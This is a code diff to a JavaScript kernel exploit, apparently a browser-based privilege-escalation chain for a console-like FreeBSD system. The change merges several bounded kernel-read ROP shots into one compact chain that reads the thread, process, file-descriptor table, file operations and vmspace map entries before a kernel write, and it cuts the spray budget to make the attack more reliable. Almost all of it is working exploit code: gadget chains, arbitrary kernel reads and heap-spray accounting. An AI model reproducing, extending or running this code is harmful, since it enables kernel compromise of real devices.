@@ -415,7 +415,7 @@ function shooter(gad) {
     req.dv.setUint32(32, TUNE.object, true);
 
     /* A process capped at 512 descriptors cannot retain 45 new seed clones
-       for every bounded shot. After the first two full-density shots, use
+       for every kernel shot. After the first two full-density shots, use
        Afterglow's original eight-clone taper. The high-limit route keeps the
        denser refill on every shot because it was more reliable in this host. */
     const want = STATE.taperSeed && STATE.clones >= 60 ? TUNE.spare : TUNE.seed;
@@ -486,19 +486,15 @@ function qAt(buf, off) {
   return v(buf.dv.getUint32(off, true), buf.dv.getUint32(off + 4, true));
 }
 
-/* Break the original merged r2 into bounded reads. Each returned pointer is
-   checked in JavaScript before the next kernel read or the first write. */
+/* Keep Afterglow's evidence-backed separate state and map reads. The 14.02
+   port previously split this into many independent APM shots; every extra
+   shot was another chance to miss before the payload could start. Values from
+   both compact reads are still validated before the first kernel write. */
 async function captureHostState(shot, kbase, probe, reach, hostPage) {
-  const fire = async function (stage, build, room) {
-    if (!await checkpoint(stage + "-armed", "bounded kernel read"))
-      throw new Error(stage + ": PC collector did not acknowledge the shot");
-    const result = shot.take(build, room || 0x400);
-    if (!ran(result)) throw new Error(stage + ": kernel read shot missed: " + shot.why);
-    say("[3] " + stage + " returned");
-  };
   try {
     if (reach < 2 || reach > 192 || probe < 0 || probe > 0xffff)
-      throw new Error("map reach or probe fd exceeds the bounded plan");
+      throw new Error("map reach or probe fd exceeds the compact plan");
+
     const tidOut = alloc(8); wipe(tidOut, 8);
     const tidRv = sc(S.thr_self, tidOut.at).i32;
     const userTid = tidOut.dv.getInt32(0, true);
@@ -507,157 +503,132 @@ async function captureHostState(shot, kbase, probe, reach, hostPage) {
         tidOut.dv.getUint32(4, true) !== 0)
       throw new Error("thread or process ID syscall failed");
 
-    const savedRbp = alloc(8), threadOut = alloc(8);
-    wipe(savedRbp, 8); wipe(threadOut, 8);
-    await fire("thread", function (c) {
-      c.slot(plus(kbase, K.swap_rbp)); c.save_rax(savedRbp.at);
+    const note = alloc(128), ftab = alloc(0x100), fdHeader = alloc(0x40);
+    const kernelTidOut = alloc(4), kernelPidOut = alloc(4);
+    wipe(note, 128); wipe(ftab, 0x100); wipe(fdHeader, 0x40);
+    wipe(kernelTidOut, 4); wipe(kernelPidOut, 4);
+
+    if (!await checkpoint("state-armed", "compact kernel state read"))
+      throw new Error("state: PC collector did not acknowledge the shot");
+    const stateR = shot.take(function (c) {
+      /* The verified GS gadget yields this browser thread and pops RBP. Save
+         the thread, restore RBP immediately, then continue the state capture. */
+      c.slot(plus(kbase, K.swap_rbp)); c.save_rax(note.at);
       c.slot(plus(kbase, K.swap_rbp));
       c.slot(plus(kbase, 0x74de23)); c.num(0);
-      c.save_rax(threadOut.at);
-      c.load_rax(savedRbp.at); c.slot(plus(kbase, K.swap_rbp));
+      c.save_rax(plus(note.at, 8));                         /* thread */
+      c.load_rax(note.at); c.slot(plus(kbase, K.swap_rbp));
       if (c.n !== 15) throw new Error("GS thread chain changed length");
-    });
-    const thread = qAt(threadOut, 0), oldRbp = qAt(savedRbp, 0);
+
+      c.load_rax(plus(note.at, 8)); c.rdi(0x88); c.gad("add");
+      c.grab(kernelTidOut.at, 4);                          /* td_tid */
+      c.load_rax(plus(note.at, 8)); c.follow(8);
+      c.save_rax(plus(note.at, 16));                       /* process */
+
+      c.load_rax(plus(note.at, 16)); c.rdi(0xb0); c.gad("add");
+      c.grab(kernelPidOut.at, 4);                          /* p_pid */
+      c.load_rax(plus(note.at, 16)); c.follow(0x48);
+      c.save_rax(plus(note.at, 24));                       /* filedesc */
+      c.load_rax(plus(note.at, 16)); c.follow(0x168);
+      c.save_rax(plus(note.at, 32));                       /* vmspace */
+
+      c.load_rax(plus(note.at, 24)); c.grab(fdHeader.at, 0x40);
+      c.load_rax(plus(note.at, 24)); c.follow(0);
+      c.save_rax(plus(note.at, 56));                       /* fd_ofiles */
+      c.follow(probe * 8); c.save_rax(plus(note.at, 40));  /* file */
+      c.gad("load8"); c.save_rax(plus(note.at, 48));      /* f_ops */
+      c.grab(ftab.at, 0x58);
+
+      c.load_rax(plus(note.at, 32)); c.follow(8);
+      c.save_rax(plus(note.at, 72));                       /* first map */
+    }, 0x2000);
+    if (!ran(stateR))
+      throw new Error("state: compact kernel read missed: " + shot.why);
+
+    const oldRbp = qAt(note, 0), thread = qAt(note, 8), proc = qAt(note, 16);
+    const filedesc = qAt(note, 24), vmspace = qAt(note, 32);
+    const file = qAt(note, 40), ops = qAt(note, 48);
+    const ofiles = qAt(note, 56), mapHead = qAt(note, 72);
     if (!inHeap(thread) || (thread.low & 7) !== 0 ||
         oldRbp.hi < 0xffff0000 || oldRbp.low === 0 || (oldRbp.low & 7) !== 0)
       throw new Error("GS thread or saved RBP was implausible");
-
-    const procRef = alloc(16), tidRef = alloc(16);
-    const procOut = alloc(8), kernelTidOut = alloc(4);
-    pokeAt(procRef, 0, plus(thread, 8));
-    pokeAt(tidRef, 0, plus(thread, 0x88));
-    wipe(procOut, 8); wipe(kernelTidOut, 4);
-    await fire("proc", function (c) {
-      c.load_rax(procRef.at); c.grab(procOut.at, 8);
-      c.load_rax(tidRef.at); c.grab(kernelTidOut.at, 4);
-    });
-    const proc = qAt(procOut, 0);
     if (!inHeap(proc) || (proc.low & 7) !== 0 ||
         kernelTidOut.dv.getInt32(0, true) !== userTid)
       throw new Error("thread proc or TID did not match this browser thread");
-
-    const pidRef = alloc(16), fdRef = alloc(16), vmRef = alloc(16);
-    const pidOut = alloc(4), fdOut = alloc(8), vmOut = alloc(8);
-    pokeAt(pidRef, 0, plus(proc, 0xb0));
-    pokeAt(fdRef, 0, plus(proc, 0x48));
-    pokeAt(vmRef, 0, plus(proc, 0x168));
-    wipe(pidOut, 4); wipe(fdOut, 8); wipe(vmOut, 8);
-    await fire("proc-fields", function (c) {
-      c.load_rax(pidRef.at); c.grab(pidOut.at, 4);
-      c.load_rax(fdRef.at); c.grab(fdOut.at, 8);
-      c.load_rax(vmRef.at); c.grab(vmOut.at, 8);
-    });
-    const filedesc = qAt(fdOut, 0), vmspace = qAt(vmOut, 0);
-    if (pidOut.dv.getInt32(0, true) !== userPid ||
+    if (kernelPidOut.dv.getInt32(0, true) !== userPid ||
         !inHeap(filedesc) || !inHeap(vmspace) ||
         (filedesc.low & 7) !== 0 || (vmspace.low & 7) !== 0)
       throw new Error("process ID, filedesc or vmspace failed validation");
-
-    const fdHeaderRef = alloc(16), fdHeader = alloc(0x40);
-    pokeAt(fdHeaderRef, 0, filedesc); wipe(fdHeader, 0x40);
-    await fire("fd-header", function (c) {
-      c.load_rax(fdHeaderRef.at); c.grab(fdHeader.at, 0x40);
-    });
-    const ofiles = qAt(fdHeader, 0);
     const capacity = fdHeader.dv.getInt32(0x28, true);
     const lastfile = fdHeader.dv.getInt32(0x38, true);
     const futureSeed = STATE.taperSeed && STATE.clones >= 60 ? TUNE.spare : TUNE.seed;
     const futurePerShot = 3 + futureSeed + TUNE.spare;
-    const remainingShots = 5 + Math.ceil(reach / 48);
+    const remainingShots = 3; /* map read, live write guard, writer */
     const headroomFloor = remainingShots * futurePerShot + 16;
     say("[3] fd header ofiles=" + text(ofiles) + " capacity=" + capacity +
       " lastfile=" + lastfile + " probe=" + probe +
       " required-headroom=" + headroomFloor);
-    /* The snapshot is taken while 126 temporary spray sockets are open.
-       Every future shot permanently keeps one base clone, one watched clone,
-       one kqueue, its seed clones and its spare clones. Prove the current
-       table can hold every remaining budgeted shot plus a 16-fd margin, then
-       re-read fd_ofiles live before following the probe descriptor. */
-    if (!inHeap(ofiles) || (ofiles.low & 7) !== 0 ||
+    if (!same(ofiles, qAt(fdHeader, 0)) ||
+        !inHeap(ofiles) || (ofiles.low & 7) !== 0 ||
         capacity <= 0 || capacity > 0x10000 ||
         lastfile < probe || lastfile >= capacity ||
         capacity - 1 - lastfile < headroomFloor)
       throw new Error("filedesc header or FD headroom failed validation");
-
-    /* Re-read fd_ofiles inside the shot that follows the probe descriptor.
-       A prior snapshot is used only as a comparison, never as a live source. */
-    const freshOfilesOut = alloc(8), fileOut = alloc(8);
-    wipe(freshOfilesOut, 8); wipe(fileOut, 8);
-    await fire("file", function (c) {
-      c.load_rax(fdHeaderRef.at); c.follow(0);
-      c.save_rax(freshOfilesOut.at);
-      c.follow(probe * 8); c.save_rax(fileOut.at);
-    });
-    const freshOfiles = qAt(freshOfilesOut, 0), file = qAt(fileOut, 0);
-    if (!same(ofiles, freshOfiles) || !inHeap(file) || (file.low & 7) !== 0)
-      throw new Error("probe file or live fd_ofiles changed across shots");
-
-    const opsRef = alloc(16), opsOut = alloc(8);
-    pokeAt(opsRef, 0, plus(file, 8)); wipe(opsOut, 8);
-    await fire("file-ops", function (c) {
-      c.load_rax(opsRef.at); c.grab(opsOut.at, 8);
-    });
-    const ops = qAt(opsOut, 0);
+    if (!inHeap(file) || (file.low & 7) !== 0)
+      throw new Error("probe file pointer was implausible");
     if (!inText(ops) || (ops.low & 7) !== 0)
       throw new Error("probe file operation table pointer was implausible");
-    const ftab = alloc(0x100), tableRef = alloc(16);
-    const mapHeadRef = alloc(16), mapHeadOut = alloc(8);
-    wipe(ftab, 0x100); pokeAt(tableRef, 0, ops);
-    pokeAt(mapHeadRef, 0, plus(vmspace, 8)); wipe(mapHeadOut, 8);
-    await fire("ops-and-map-head", function (c) {
-      c.load_rax(tableRef.at); c.grab(ftab.at, 0x58);
-      c.load_rax(mapHeadRef.at); c.grab(mapHeadOut.at, 8);
-    });
     let sane = 0;
     for (let i = 0; i < 10; i++) if (inText(qAt(ftab, i * 8))) sane++;
     if (sane < 6) throw new Error("operation table has too few kernel pointers");
-
-    let entry = qAt(mapHeadOut, 0);
-    if (!inHeap(entry) || (entry.low & 7) !== 0)
+    if (!inHeap(mapHead) || (mapHead.low & 7) !== 0)
       throw new Error("vmspace map head was implausible");
 
     const maps = alloc(reach * TUNE.stride + 0x100);
+    const mapAddresses = alloc(reach * 8 + 0x10);
     wipe(maps, reach * TUNE.stride);
-    const addresses = [];
-    let hit = null;
-    for (let first = 0; first < reach && hit === null; first += 48) {
-      const count = Math.min(48, reach - first);
-      const entryRef = alloc(16), nextOut = alloc(8);
-      pokeAt(entryRef, 0, entry); wipe(nextOut, 8);
-      await fire("map-" + first, function (c) {
-        c.load_rax(entryRef.at);
-        for (let i = 0; i < count; i++) {
-          const source = c.grab(plus(maps.at, (first + i) * TUNE.stride), TUNE.stride);
-          c.load_rax(c.where(source)); c.gad("load8");
-        }
-        c.save_rax(nextOut.at);
-      }, 0x2000);
-      for (let i = 0; i < count; i++) {
-        const at = (first + i) * TUNE.stride;
-        if (!inHeap(entry) || (entry.low & 7) !== 0)
-          throw new Error("map link was not a kernel heap pointer");
-        addresses[first + i] = entry;
-        const from = qAt(maps, at + 0x20), upto = qAt(maps, at + 0x28);
-        const next = qAt(maps, at + 8);
-        if (next.low === entry.low && next.hi === entry.hi)
-          throw new Error("map list looped on itself");
-        if (upto.hi - from.hi <= 0x100) {
-          const above = from.hi < hostPage.hi ||
-            (from.hi === hostPage.hi && from.low <= hostPage.low);
-          const below = hostPage.hi < upto.hi ||
-            (hostPage.hi === upto.hi && hostPage.low < upto.low);
-          if (above && below && hit === null) hit = first + i;
-        }
-        entry = next;
+    wipe(mapAddresses, reach * 8);
+    const mapHeadRef = alloc(16); pokeAt(mapHeadRef, 0, mapHead);
+    if (!await checkpoint("map-armed", "compact kernel map walk"))
+      throw new Error("map: PC collector did not acknowledge the shot");
+    const mapR = shot.take(function (c) {
+      c.load_rax(mapHeadRef.at);
+      for (let i = 0; i < reach; i++) {
+        c.save_rax(plus(mapAddresses.at, i * 8));
+        const source = c.grab(plus(maps.at, i * TUNE.stride), TUNE.stride);
+        c.load_rax(c.where(source)); c.gad("load8");
       }
-      if (!same(entry, qAt(nextOut, 0)))
+    }, 0x1000 + reach * 0x100);
+    if (!ran(mapR))
+      throw new Error("map: compact kernel read missed: " + shot.why);
+
+    const addresses = [];
+    let entry = mapHead;
+    let hit = null;
+    for (let i = 0; i < reach; i++) {
+      const at = i * TUNE.stride;
+      if (!same(entry, qAt(mapAddresses, i * 8)))
         throw new Error("map walk continuation did not match copied links");
+      if (!inHeap(entry) || (entry.low & 7) !== 0)
+        throw new Error("map link was not a kernel heap pointer");
+      addresses[i] = entry;
+      const from = qAt(maps, at + 0x20), upto = qAt(maps, at + 0x28);
+      const next = qAt(maps, at + 8);
+      if (same(next, entry)) throw new Error("map list looped on itself");
+      if (upto.hi - from.hi <= 0x100) {
+        const above = from.hi < hostPage.hi ||
+          (from.hi === hostPage.hi && from.low <= hostPage.low);
+        const below = hostPage.hi < upto.hi ||
+          (hostPage.hi === upto.hi && hostPage.low < upto.low);
+        if (above && below && hit === null) hit = i;
+      }
+      entry = next;
     }
     if (hit === null) throw new Error("no validated mapping covers the host page");
-    say("[3] validated file, operation table and host-page map entry " + hit);
+    say("[3] compact state and map reads validated; host-page entry " + hit);
     return { file, ops, ftab, maps, hit, here: addresses[hit] };
   } catch (error) {
-    say("[3] bounded kernel read stopped: " + ((error && error.message) || error));
+    say("[3] compact kernel read stopped: " + ((error && error.message) || error));
     say("[3] no kernel write from this stage; cold power off before another attempt");
     return null;
   }
@@ -1468,9 +1439,8 @@ async function attempt(ctx, opts) {
       if (above && below) { reach = i + 2; break; }
     }
   }
-  if (!reach || reach > 192 ||
-      shot.fired + 7 + Math.ceil(reach / 48) + 2 > TUNE.units) {
-    say("[3a] mapped host page exceeds the one-shot read and FD budget");
+  if (!reach || reach > 192 || shot.fired + 4 > TUNE.units) {
+    say("[3a] mapped host page exceeds the compact read and FD budget");
     return false;
   }
   say("[3a] walking " + reach + " of " + TUNE.entries + " entries"
